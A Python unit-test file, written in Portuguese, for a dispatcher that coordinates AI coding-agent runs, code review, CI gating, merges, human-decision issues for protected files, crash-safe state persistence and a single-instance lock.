import copy
import datetime
import io
import json
import os
import pathlib
import stat
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

RAIZ_SCRIPTS = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(RAIZ_SCRIPTS))

import despachante  # noqa: E402
import estado as est  # noqa: E402
import forja  # noqa: E402
import motor  # noqa: E402
import prompts  # noqa: E402

SCRIPT = RAIZ_SCRIPTS / "despachante.py"
REPO = "dono/cliente"
PROJETO = "prj_cliente"
PR = "https://github.com/dono/cliente/pull/7"
PR_ORQ = "https://github.com/dono/cliente/pull/90"
H1 = "1" * 40
H2 = "2" * 40
H3 = "3" * 40
TOKEN = "tok-secreto-warren-123456"
TOKEN_GH = "ghp_segredo_github_987654"


def _modelo(modelo, custo, esforco="medium"):
    return {"agente": "claude-code", "modelo": modelo, "esforco": esforco, "maxCustoUsd": custo}


SONNET = "claude-sonnet-5-5"
OPUS = "claude-opus-5-5"
HAIKU = "claude-haiku-5-5"
FABLE = "claude-fable-5-1"

CONFIG = {
    "limiteParalelo": 3,
    "branchPadrao": "main",
    "protegidos": ["**/migrations/**", ".github/**", ".fabrica/config.json", "**/auth/**", ".env*"],
    "modelos": {
        "orquestrador": _modelo(FABLE, 20, "high"),
        "arquiteto": _modelo(SONNET, 10),
        "produto": _modelo(HAIKU, 5),
        "ux-ui": _modelo(SONNET, 10),
        "frontend": _modelo(SONNET, 10),
        "backend": _modelo(SONNET, 10),
        "qa": _modelo(SONNET, 10),
        "revisor": _modelo(OPUS, 5),
        "devops": _modelo(SONNET, 10),
        "seguranca": _modelo(SONNET, 10),
        "fixer": _modelo(HAIKU, 5),
    },
    "verificacao": {"imagem": "node:22-bookworm", "memoria": "3g", "cpus": "2", "rede": "internet"},
}


def raia(id_, papel="backend", plano_seeds="pl-000a", depende=(), arquivos=None, verificacao="pnpm test"):
    return {
        "id": id_,
        "papel": papel,
        "planoSeeds": plano_seeds,
        "dependeDe": list(depende),
        "arquivos": arquivos or [f"src/{id_}/"],
        "verificacao": verificacao,
        "criteriosAceite": [f"{id_} pronta"],
    }


def plano(*raias_, fase="f1"):
    return {
        "versao": 1,
        "faseAtual": fase,
        "fases": [{"id": fase, "raias": [r["id"] for r in raias_]}],
        "raias": list(raias_),
    }


def veredito_texto(sha, resultado="aprovado", achados=()):
    corpo = json.dumps({"sha": sha, "resultado": resultado, "achados": list(achados)})
    return f"Revisei o diff.\n{prompts.INICIO_VEREDITO}\n{corpo}\n{prompts.FIM_VEREDITO}\n"


def _gerar_head(n):
    return ("%x" % n).rjust(40, "e")


class _AjudasDoOrquestrador:
    def acordar_por_falha(self, plano_=None):
        d = self.preparar_raia(plano_)
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        d.ciclo()
        orq = self.estado()["orquestrador"]
        self.assertEqual(orq["motivo"], "raia_falhou")
        return d, orq["runId"]

    def pr_do_orquestrador(self, run_id, arquivos, plano_=None, pergunta=None, head=H3, url=PR_ORQ, ci="verde"):
        self.motor.definir_run(run_id, estado="succeeded", prUrl=url)
        self.forja.definir_pr(url, head_sha=head, branch="warren/orq", arquivos=list(arquivos))
        if ci is not None:
            self.forja.definir_ci(REPO, head, ci)
        if plano_ is not None:
            self.publicar(plano_, ref=head)
        if pergunta is not None:
            self.forja.definir_arquivo(REPO, head, ".fabrica/pergunta.md", pergunta)

    def orquestrador(self):
        return self.estado()["orquestrador"]


class Base(_AjudasDoOrquestrador, unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = pathlib.Path(tmp.name)
        self.raiz = self.tmp / "raiz"
        self.raiz.mkdir()
        self.repo_dir = self.tmp / "repo"
        self.repo_dir.mkdir()
        self.motor = motor.MotorFalso()
        self.forja = forja.ForjaFalsa()
        self.verificacoes = []
        self.codigos = {}
        self.limpezas = []
        self.instante = datetime.datetime(2026, 11, 3, 12, 0, 0)

    def verificar_falso(self, repo_dir, sha, comando, *, conteiner):
        self.verificacoes.append((repo_dir, sha, comando, conteiner))
        return {"sha": sha, "codigo": self.codigos.get(sha, 0), "saida": f"saída da verificação de {sha[:4]}"}

    def limpar_falso(self):
        self.limpezas.append(1)
        return {"conteineres": 2, "redes": 1, "diretorios": 0, "erros": []}

    def novo(self, *, config=None, motor_=None, forja_=None, **extra):
        argumentos = dict(
            motor=motor_ or self.motor,
            forja=forja_ or self.forja,
            raiz=self.raiz,
            repo_dir=self.repo_dir,
            config=copy.deepcopy(config if config is not None else getattr(self, "config_padrao", CONFIG)),
            verificar=self.verificar_falso,
            agora=lambda: self.instante,
            projeto=PROJETO,
            repo=REPO,
            limpar_residuos=self.limpar_falso,
            segredos=(TOKEN, TOKEN_GH),
        )
        argumentos.update(extra)
        return despachante.Despachante(**argumentos)

    def publicar(self, plano_, ref="main"):
        texto = plano_ if isinstance(plano_, str) else json.dumps(plano_)
        self.forja.definir_arquivo(REPO, ref, ".fabrica/plano.json", texto)

    def estado(self):
        return json.loads((self.raiz / "estado.json").read_text(encoding="utf-8"))

    def log(self):
        caminho = self.raiz / "log.jsonl"
        if not caminho.exists():
            return []
        return [json.loads(linha) for linha in caminho.read_text(encoding="utf-8").splitlines()]

    def acordadas(self):
        caminho = self.raiz / "acordadas.jsonl"
        if not caminho.exists():
            return []
        return [json.loads(linha) for linha in caminho.read_text(encoding="utf-8").splitlines()]

    def runs(self, modelo=None):
        return [
            a
            for nome, a in self.motor.chamadas
            if nome == "despachar_run" and (modelo is None or a["modelo"] == modelo)
        ]

    def planos_despachados(self):
        return [a for nome, a in self.motor.chamadas if nome == "despachar_plano"]

    def preparar_raia(self, plano_=None):
        self.publicar(plano_ or plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        return d

    def abrir_pr(self, head=H1, arquivos=("src/a/x.ts",), ci="verde", plan_run="plano-1", seed="s-1", url=PR):
        self.motor.definir_plano(
            plan_run, "running", [{"seedId": seed, "estado": "pr_open", "runId": "run-filho", "prUrl": url}]
        )
        self.forja.definir_pr(url, head_sha=head, branch="warren/" + seed, arquivos=list(arquivos))
        self.forja.definir_ci(REPO, head, ci)

    def mover_head(self, head, ci="verde", arquivos=("src/a/x.ts",)):
        self.forja.definir_pr(PR, head_sha=head, branch="warren/s-1", arquivos=list(arquivos))
        self.forja.definir_ci(REPO, head, ci)

    def terminar_revisao(self, sha, resultado="aprovado", achados=(), seed="s-1"):
        rid = self.estado()["seeds"][seed]["revisaoRunId"]
        self.assertTrue(rid, "não há revisão em curso")
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_texto(rid, veredito_texto(sha, resultado, achados))
        return rid




# ---------------------------------------------------------------- jornadas do brief


class TestesJornada(Base):
    def test_jornada_de_uma_seed_ate_o_merge(self):
        d = self.preparar_raia()
        despachos = self.planos_despachados()
        self.assertEqual(len(despachos), 1)
        self.assertEqual(
            despachos[0],
            {
                "projeto": PROJETO,
                "plano_seeds": "pl-000a",
                "agente": "claude-code",
                "modelo": SONNET,
                "prompt_template": prompts.prompt_template_raia("backend"),
                "max_custo_usd": 10,
            },
        )
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")

        self.abrir_pr(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["revisar", "verificar"])
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "em_revisao")
        (revisao,) = self.runs()
        self.assertEqual(revisao["modelo"], OPUS)
        self.assertEqual(revisao["agente"], "claude-code")
        self.assertEqual(revisao["max_custo_usd"], 5)
        self.assertEqual(revisao["branch_existente"], "warren/s-1")
        self.assertEqual(revisao["projeto"], PROJETO)
        self.assertEqual(revisao["prompt"], prompts.prompt_revisor(seed_id="s-1", raia=raia("a"), sha=H1))
        self.assertEqual(self.verificacoes, [(self.repo_dir, H1, "pnpm test", CONFIG["verificacao"])])
        self.assertEqual(self.forja.merges, [])

        d.ciclo()  # revisão ainda rodando: nada de merge nem de nova revisão
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.runs()), 1)

        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["mergear"])
        self.assertEqual(self.forja.merges, [(PR, H1)])
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "mergeada")

    def test_gate_vermelho_corrige_uma_vez_e_acorda(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="vermelho")
        d.ciclo()
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["corrigir"])
        (fixer,) = self.runs(HAIKU)
        self.assertEqual(fixer["branch_existente"], "warren/s-1")
        self.assertEqual(fixer["max_custo_usd"], 5)
        self.assertIn("CI vermelho", fixer["prompt"])
        self.assertIn("saída da verificação de 1111", fixer["prompt"])
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]

        self.motor.definir_run(fid, estado="succeeded")
        self.mover_head(H2, ci="vermelho")
        acoes = d.ciclo()
        self.assertEqual([(a["tipo"], a["sha"]) for a in acoes], [("revisar", H2), ("verificar", H2)])
        self.terminar_revisao(H2)
        acoes = d.ciclo()
        self.assertEqual(
            [(a["tipo"], a.get("motivo")) for a in acoes], [("acordar", "gate_falhou_apos_fixer")]
        )
        self.assertEqual(len(self.runs(HAIKU)), 1)
        (orq,) = self.runs(FABLE)
        self.assertEqual(orq["branch_existente"], None)
        self.assertEqual(orq["max_custo_usd"], 20)
        self.assertIn("Motivo: gate_falhou_apos_fixer", orq["prompt"])
        self.assertIn('"ci": "vermelho"', orq["prompt"])
        self.assertIn('"seed": "s-1"', orq["prompt"])
        (linha,) = self.acordadas()
        self.assertEqual(set(linha), {"ts", "motivo", "alvo", "runId"})
        self.assertEqual((linha["motivo"], linha["alvo"]), ("gate_falhou_apos_fixer", "s-1"))
        self.assertEqual(linha["runId"], self.estado()["orquestrador"]["runId"])
        self.assertEqual(linha["ts"], self.instante.isoformat())

        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(len(self.runs(HAIKU)), 1)
        self.assertEqual(self.forja.merges, [])

    def test_fixer_muda_head_e_exige_nova_revisao(self):
        self.codigos[H1] = 1
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)  # aprovado no head antigo
        self.assertEqual([a["tipo"] for a in d.ciclo()], ["corrigir"])
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]
        self.motor.definir_run(fid, estado="succeeded")
        self.mover_head(H2)
        acoes = d.ciclo()
        self.assertEqual([(a["tipo"], a["sha"]) for a in acoes], [("revisar", H2), ("verificar", H2)])
        self.assertEqual(self.forja.merges, [])

        # um veredito que ainda fala do head antigo não libera o merge
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertNotIn("mergear", [a["tipo"] for a in acoes])
        self.assertEqual(self.forja.merges, [])

        self.terminar_revisao(H2)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H2)])

    def test_admissao_cheia_adia_sem_duplicar(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        self.motor.lotar()
        d.ciclo()
        disco = self.estado()
        self.assertEqual(disco["raias"]["a"]["estado"], "planejada")
        self.assertIsNone(disco["raias"]["a"]["planRunId"])
        self.assertNotIn("acaoEmCurso", disco)
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"], dict(self.estado()["raias"]["a"], estado="executando"))
        self.assertEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 2)  # um recusado, um aceito
        self.assertEqual(self.motor.plano("plano-1")["estado"], "running")
        with self.assertRaises(KeyError):
            self.motor.plano("plano-2")

    def test_admissao_cheia_na_revisao_adia_sem_escalar(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        self.motor.lotar()
        d.ciclo()
        seed = self.estado()["seeds"]["s-1"]
        self.assertIsNone(seed["revisaoRunId"])
        self.assertIsNone(seed["pendenteHumano"])
        self.assertEqual(seed["tentativasRevisao"], 0)
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 2)  # uma recusada, uma aceita
        self.assertTrue(self.estado()["seeds"]["s-1"]["revisaoRunId"])
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 2)

    def test_reinicio_nao_redespacha(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        planos, runs, verifs = len(self.planos_despachados()), len(self.runs()), len(self.verificacoes)
        del d
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(len(self.planos_despachados()), planos)
        self.assertEqual(len(self.runs()), runs)
        self.assertEqual(len(self.verificacoes), verifs)

    def test_protegido_abre_decisao_e_nao_mergeia(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("src/a/x.ts", "prisma/migrations/001.sql"))
        d.ciclo()
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["aguardar_humano"])
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] s-1: decisão necessária")
        self.assertIn("toca arquivos protegidos: prisma/migrations/001.sql", corpo)
        self.assertIn(PR, corpo)
        disco = self.estado()
        self.assertEqual(disco["seeds"]["s-1"]["estado"], "bloqueada_humano")
        self.assertEqual(
            disco["decisoes"],
            [
                {
                    "url": "https://github.com/dono/cliente/issues/1",
                    "motivo": "toca arquivos protegidos: prisma/migrations/001.sql",
                    "alvo": "s-1",
                }
            ],
        )
        d.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)
        self.assertEqual(self.forja.merges, [])

    def test_resposta_do_paulo_acorda_orquestrador(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/002.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (decisao,) = self.estado()["decisoes"]
        d.ciclo()  # ainda aberta: nada
        self.assertEqual(self.runs(FABLE), [])
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Pode seguir com a migração.")
        d.ciclo()
        (orq,) = self.runs(FABLE)
        self.assertIn("Motivo: resposta_paulo", orq["prompt"])
        self.assertIn("Pode seguir com a migração.", orq["prompt"])
        self.assertIn("toca arquivos protegidos", orq["prompt"])
        disco = self.estado()
        self.assertEqual(disco["decisoes"], [])
        self.assertEqual(disco["orquestrador"]["motivo"], "resposta_paulo")
        self.assertIn(f"resposta_paulo:{decisao['url']}", disco["chavesAcordadas"])
        (linha,) = self.acordadas()
        self.assertEqual((linha["motivo"], linha["alvo"]), ("resposta_paulo", decisao["url"]))
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_resposta_do_paulo_espera_o_orquestrador_livre_sem_se_perder(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/002.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (decisao,) = self.estado()["decisoes"]
        # o orquestrador já está ocupado com outra coisa
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d.iniciar(spec="docs/spec.md")
        (primeiro,) = self.runs(FABLE)
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="ok")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(self.estado()["decisoes"], [])
        self.assertEqual(len(self.estado()["acordarPendentes"]), 1)
        # um novo Despachante (reinício) não perde a resposta
        outro = self.novo()
        rid = self.estado()["orquestrador"]["runId"]
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/pergunta.md"])
        self.forja.definir_arquivo(REPO, H3, ".fabrica/pergunta.md", "Qual banco?")
        outro.ciclo()
        segundo = self.runs(FABLE)[-1]
        self.assertIsNot(segundo, primeiro)
        self.assertIn("Motivo: resposta_paulo", segundo["prompt"])
        self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_decisao_fechada_sem_comentario_e_reaberta_e_continua_acompanhada(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/002.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (decisao,) = self.estado()["decisoes"]
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="")
        d.ciclo()
        self.assertEqual(self.estado()["decisoes"], [decisao])
        self.assertEqual(self.runs(FABLE), [])
        info = self.forja.decisao(decisao["url"])
        self.assertFalse(info["fechada"])
        self.assertIn("Feche com um comentário dizendo a decisão", info["ultimoComentario"])
        # o comentário do próprio despachante nunca vale como resposta
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario=info["ultimoComentario"])
        d.ciclo()
        self.assertEqual(self.runs(FABLE), [])
        self.assertFalse(self.forja.decisao(decisao["url"])["fechada"])
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Pode mergear.")
        d.ciclo()
        self.assertEqual(self.estado()["decisoes"], [])
        self.assertIn("Pode mergear.", self.runs(FABLE)[-1]["prompt"])

    def test_retomar_do_despachante_zera_falhas_de_acordar(self):
        d = self.preparar_raia()
        d.estado["falhasAcordar"] = 2
        d.estado["pausado"] = "acordar falhou"
        d.retomar()
        self.assertEqual((self.estado()["pausado"], self.estado()["falhasAcordar"]), (None, 0))
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "retomar"]
        self.assertEqual(linha["antes"], {"pausado": "acordar falhou", "falhasAcordar": 2})

    def test_cota_pausa_e_retomar_libera(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "API Error: 429 rate limit reached")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(self.estado()["pausado"], "cota")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(len(self.runs(OPUS)), 1)
        d.retomar()
        disco = self.estado()
        self.assertIsNone(disco["pausado"])
        self.assertEqual(disco["falhasAcordar"], 0)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["revisar"])
        self.assertEqual(len(self.runs(OPUS)), 2)
        self.assertIn("retomar", [linha.get("evento") for linha in self.log()])


# ---------------------------------------------------------------- ordem do ciclo


class TestesOrdemDoCiclo(Base):
    def _eventos(self):
        eventos = []
        for nome, alvo in (("motor", self.motor), ("forja", self.forja)):
            original = alvo._registrar

            def registrar(n, _o=original, _q=nome, **argumentos):
                eventos.append((_q, n, argumentos))
                _o(n, **argumentos)

            alvo._registrar = registrar
        return eventos

    def test_plano_runs_e_orquestrador_antes_dos_planos_e_dos_prs(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d.iniciar(spec="docs/spec.md")
        rev = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        orq = self.estado()["orquestrador"]["runId"]
        self.motor.definir_run(orq, estado="succeeded")  # sem PR
        eventos = self._eventos()
        d.ciclo()

        def indice(quem, nome, **argumentos):
            for i, (q, n, a) in enumerate(eventos):
                if q == quem and n == nome and all(a.get(k) == v for k, v in argumentos.items()):
                    return i
            self.fail(f"chamada ausente: {quem}.{nome} {argumentos}")

        plano_main = indice("forja", "arquivo", ref="main", caminho=".fabrica/plano.json")
        run_rev = indice("motor", "run", run_id=rev)
        run_orq = indice("motor", "run", run_id=orq)
        plano_raia = indice("motor", "plano", plan_run_id="plano-1")
        pr = indice("forja", "pr", url=PR)
        ci = indice("forja", "ci", sha=H1)
        self.assertEqual(plano_main, 0)
        self.assertLess(plano_main, run_rev)
        self.assertLess(run_rev, plano_raia)
        self.assertLess(run_orq, plano_raia)
        self.assertLess(plano_raia, pr)
        self.assertLess(pr, ci)
        lidos = [a["run_id"] for q, n, a in eventos if q == "motor" and n == "run"]
        self.assertEqual(lidos.count(rev), 1)
        self.assertEqual(lidos.count(orq), 1)

    def test_sincroniza_o_plano_a_cada_ciclo(self):
        d = self.preparar_raia()
        with mock.patch.object(despachante.est, "sincronizar_plano", wraps=est.sincronizar_plano) as espiao:
            d.ciclo()
            d.ciclo()
            d.ciclo()
        self.assertEqual(espiao.call_count, 3)

    def test_raia_falhou_volta_quando_o_orquestrador_termina_depois_do_plano_novo(self):
        # o plano novo chega com o orquestrador ainda rodando; a raia só volta quando ele termina,
        # num ciclo em que o plano já não muda: isso exige sincronizar a cada ciclo, depois de concluir
        d = self.preparar_raia()
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")
        orq = self.estado()["orquestrador"]["runId"]
        self.assertTrue(orq)
        self.publicar(plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")
        self.assertEqual(len(self.planos_despachados()), 1)
        self.motor.definir_run(orq, estado="succeeded")
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 2)
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00aa")
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")


# ---------------------------------------------------------------- persistência


class TestesPersistencia(Base):
    def test_gravacao_atomica_usa_tmp_no_mesmo_diretorio_fsync_e_replace(self):
        destino = self.raiz / "estado.json"
        destino.write_text('{"antigo": true}', encoding="utf-8")
        ordem = []
        replace_original, fsync_original = os.replace, os.fsync

        def replace(origem, alvo):
            ordem.append(("replace", origem, alvo))
            return replace_original(origem, alvo)

        def fsync(fd):
            ordem.append(("fsync", os.fstat(fd).st_mode))
            return fsync_original(fd)

        with mock.patch.object(despachante.os, "replace", side_effect=replace), mock.patch.object(
            despachante.os, "fsync", side_effect=fsync
        ):
            despachante.gravar_json_atomico(destino, {"novo": 1})
        ((_, origem, alvo),) = [o for o in ordem if o[0] == "replace"]
        self.assertEqual(pathlib.Path(alvo), destino)
        self.assertEqual(pathlib.Path(origem).parent, self.raiz)
        self.assertNotEqual(pathlib.Path(origem), destino)
        indice_replace = ordem.index(("replace", origem, alvo))
        # o conteúdo do temporário (um arquivo regular) vai ao disco antes da troca
        self.assertTrue(any(o[0] == "fsync" and stat.S_ISREG(o[1]) for o in ordem[:indice_replace]))
        self.assertEqual(json.loads(destino.read_text(encoding="utf-8")), {"novo": 1})
        self.assertEqual(sorted(p.name for p in self.raiz.iterdir()), ["estado.json"])

    def test_falha_antes_do_replace_preserva_o_arquivo_e_nao_deixa_tmp(self):
        destino = self.raiz / "estado.json"
        destino.write_text('{"antigo": true}', encoding="utf-8")
        with mock.patch.object(despachante.os, "replace", side_effect=OSError("disco cheio")):
            with self.assertRaises(OSError):
                despachante.gravar_json_atomico(destino, {"novo": 1})
        self.assertEqual(destino.read_text(encoding="utf-8"), '{"antigo": true}')
        self.assertEqual(sorted(p.name for p in self.raiz.iterdir()), ["estado.json"])

    def test_estado_e_gravado_depois_de_cada_acao(self):
        self.publicar(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d = self.novo()
        d.iniciar()
        gravados = []
        original = despachante.gravar_json_atomico

        def espiao(caminho, dados):
            if pathlib.Path(caminho).name == "estado.json":
                gravados.append(copy.deepcopy(dados))
            return original(caminho, dados)

        with mock.patch.object(despachante, "gravar_json_atomico", side_effect=espiao):
            d.ciclo()
        self.assertTrue(
            any(
                g["raias"]["a"]["estado"] == "executando"
                and g["raias"]["b"]["estado"] == "planejada"
                and not g.get("acaoEmCurso")
                for g in gravados
            ),
            "o estado não foi gravado entre a primeira e a segunda ação",
        )
        self.assertEqual(self.estado()["raias"]["b"]["estado"], "executando")

    def test_queda_no_meio_da_segunda_acao_nao_redespacha_nenhuma(self):
        class MotorQueCai(motor.MotorFalso):
            cair = True

            def despachar_plano(self, **argumentos):
                plan_run_id = super().despachar_plano(**argumentos)
                if self.cair and len([c for c in self.chamadas if c[0] == "despachar_plano"]) == 2:
                    raise KeyboardInterrupt  # o Warren aceitou, o processo morreu antes de gravar
                return plan_run_id

        self.motor = MotorQueCai()
        self.publicar(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d = self.novo()
        d.iniciar()
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        disco = self.estado()
        self.assertEqual(disco["raias"]["a"]["planRunId"], "plano-1")
        self.assertEqual(disco["acaoEmCurso"], {"tipo": "despachar_raia", "raia": "b"})
        self.motor.cair = False
        outro = self.novo()
        outro.ciclo()
        disco = self.estado()
        self.assertEqual(len(self.planos_despachados()), 2)
        self.assertEqual(disco["raias"]["a"]["estado"], "executando")
        self.assertEqual(disco["raias"]["b"]["estado"], "falhou")
        self.assertNotIn("acaoEmCurso", disco)
        self.assertTrue(any("interrompida" in a for a in disco["avisos"]))

    def test_queda_no_meio_de_acordar_pausa_em_vez_de_acordar_de_novo(self):
        class MotorQueCai(motor.MotorFalso):
            cair = True

            def despachar_run(self, **argumentos):
                run_id = super().despachar_run(**argumentos)
                if self.cair:
                    raise KeyboardInterrupt
                return run_id

        self.motor = MotorQueCai()
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        with self.assertRaises(KeyboardInterrupt):
            d.iniciar(spec="docs/spec.md")
        self.motor.cair = False
        outro = self.novo()
        self.assertEqual(outro.ciclo(), [])
        disco = self.estado()
        self.assertTrue(disco["pausado"])
        self.assertEqual(len(self.runs()), 1)
        self.assertNotIn("acaoEmCurso", disco)

    def test_falha_de_despacho_marca_falhou_e_nao_tenta_de_novo(self):
        class MotorQueFalha(motor.MotorFalso):
            def despachar_plano(self, **argumentos):
                super().despachar_plano(**argumentos)
                raise RuntimeError("POST /plan-runs: HTTP 502")

        self.motor = MotorQueFalha()
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    def test_estado_de_outro_repo_e_recusado(self):
        self.preparar_raia()
        with self.assertRaises(despachante.ConfigInvalida):
            self.novo(repo="outro/repo")

    def test_estado_ilegivel_nao_e_recriado(self):
        (self.raiz / "estado.json").write_text("{quebrado", encoding="utf-8")
        with self.assertRaises(ValueError):
            self.novo()
        self.assertEqual((self.raiz / "estado.json").read_text(encoding="utf-8"), "{quebrado")


# ---------------------------------------------------------------- trava de instância única


class TestesTrava(Base):
    def test_trava_e_exclusiva_e_liberada_ao_sair(self):
        with despachante.travar(self.raiz):
            with self.assertRaises(despachante.OutroDespachante) as ctx:
                with despachante.travar(self.raiz):
                    pass
            self.assertEqual(str(ctx.exception), "outro despachante está rodando nesta raiz")
        with despachante.travar(self.raiz):
            pass
        self.assertTrue((self.raiz / "despachante.lock").exists())

    def test_cli_sai_com_3_quando_a_trava_esta_tomada(self):
        construidos = []
        for argv in (["iniciar"], ["rodar"]):
            with self.subTest(argv=argv):
                saida, erro = io.StringIO(), io.StringIO()
                with despachante.travar(self.raiz):
                    codigo = despachante.main(
                        argv,
                        ambiente={"FABRICA_RAIZ": str(self.raiz)},
                        construir=lambda amb: construidos.append(amb),
                        saida=saida,
                        erro=erro,
                    )
                self.assertEqual(codigo, 3)
                self.assertIn("outro despachante está rodando nesta raiz", erro.getvalue())
        self.assertEqual(construidos, [])

    def test_processo_separado_tambem_e_barrado(self):
        with despachante.travar(self.raiz):
            r = subprocess.run(
                [sys.executable, "-I", "-B", str(SCRIPT), "rodar"],
                env={"FABRICA_RAIZ": str(self.raiz), "PATH": os.environ.get("PATH", "")},
                capture_output=True,
                text=True,
                timeout=30,
            )
        self.assertEqual(r.returncode, 3, r.stderr)
        self.assertIn("outro despachante está rodando nesta raiz", r.stderr)
        self.assertNotIn("Traceback", r.stderr)


# ---------------------------------------------------------------- PR do orquestrador


class TestesPrDoOrquestrador(Base):
    def test_replanejamento_valido_mergeia_com_o_sha_do_head(self):
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a", plano_seeds="pl-00aa"), raia("b", plano_seeds="pl-000b"))
        self.pr_do_orquestrador(
            rid,
            [".fabrica/plano.json", ".seeds/issues.jsonl", ".fabrica/planejamento/f1/plano.md"],
            novo_plano,
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(self.forja.decisoes, [])
        self.assertIsNone(self.estado()["orquestrador"]["runId"])
        self.assertEqual(self.estado()["orquestrador"]["ultimoMotivo"], "raia_falhou")

    def test_pr_do_orquestrador_nova_spec_abre_decisao(self):
        self.publicar(plano(raia("a")))
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        (orq,) = self.runs(FABLE)
        self.assertIn("Motivo: nova_spec", orq["prompt"])
        self.assertIn('"spec": "docs/spec.md"', orq["prompt"])
        (linha,) = self.acordadas()
        self.assertEqual((linha["motivo"], linha["alvo"]), ("nova_spec", "docs/spec.md"))
        rid = self.estado()["orquestrador"]["runId"]
        self.pr_do_orquestrador(
            rid, [".fabrica/plano.json", ".seeds/issues.jsonl"], plano(raia("a"), raia("b", plano_seeds="pl-000b"))
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] orquestrador: aprovar fase")
        self.assertIn(PR_ORQ, corpo)
        self.assertIsNone(self.estado()["orquestrador"]["runId"])
        self.assertEqual(self.estado()["decisoes"][0]["alvo"], PR_ORQ)

